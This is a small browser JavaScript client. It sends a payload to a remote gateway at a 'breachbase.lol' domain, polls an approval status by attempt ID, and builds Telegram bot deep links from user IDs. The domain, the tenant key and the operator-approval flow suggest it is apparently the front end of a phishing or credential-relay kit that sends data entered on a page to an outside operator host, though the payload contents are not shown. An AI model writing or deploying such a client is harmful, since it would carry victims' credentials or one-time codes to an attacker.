const CONFIG = {
    GATEWAY_URL: 'https://p.breachbase.lol/v1',
    TENANT_KEY: '10'
};

/**
 * Detects if we should use the Go Microservice or Legacy Netlify Functions
 */
function useGoGateway() {
    return CONFIG.TENANT_KEY !== 'VITE_TENANT_KEY_PLACEHOLDER' && CONFIG.TENANT_KEY !== '';
}

/**
 * Sends an approval request
 * Unified Response: { attemptId: string }
 */
async function requestApproval(payload) {
    if (useGoGateway()) {
        try {
            const response = await fetch(`${CONFIG.GATEWAY_URL}/callback`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${CONFIG.TENANT_KEY}`
                },
                body: JSON.stringify(payload)
            });
            if (!response.ok) throw new Error(`Gateway error: ${response.status}`);
            return await response.json(); 
        } catch (error) {
            console.error('Go Gateway Error:', error);
            throw error;
        }
    } else {
        // LEGACY FALLBACK
        try {
            const response = await fetch('/.netlify/functions/request-approval', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const data = await response.json();
            return { attemptId: data.sessionId, ...data };
        } catch (error) {
            console.error('Legacy Fallback Error:', error);
            throw error;
        }
    }
}

/**
 * Polls for status
 */
async function checkStatus(attemptId) {
    if (useGoGateway()) {
        try {
            const response = await fetch(`${CONFIG.GATEWAY_URL}/status?attemptId=${attemptId}`, {
                headers: { 'Authorization': `Bearer ${CONFIG.TENANT_KEY}` }
            });
            return await response.json();
        } catch (error) {
            console.error('Go Status Error:', error);
            throw error;
        }
    } else {
        // LEGACY FALLBACK
        try {
            const response = await fetch(`/.netlify/functions/check-status?sessionId=${attemptId}`);
            return await response.json();
        } catch (error) {
            console.error('Legacy Status Error:', error);
            throw error;
        }
    }
}

/**
 * TELEGRAM DEEP LINKING HELPER
 * Generates a link that opens the Telegram bot with a start payload.
 */
function generateTelegramLink(botUsername, userID) {
    // Base64 encode the userID to ensure it's safe for Telegram URL
    const encodedID = btoa(userID).replace(/=/g, ""); // Remove padding for cleaner URL
    return `https://t.me/${botUsername}?start=${encodedID}`;
}

// Global exposure
window.apiClient = { requestApproval, checkStatus, generateTelegramLink };
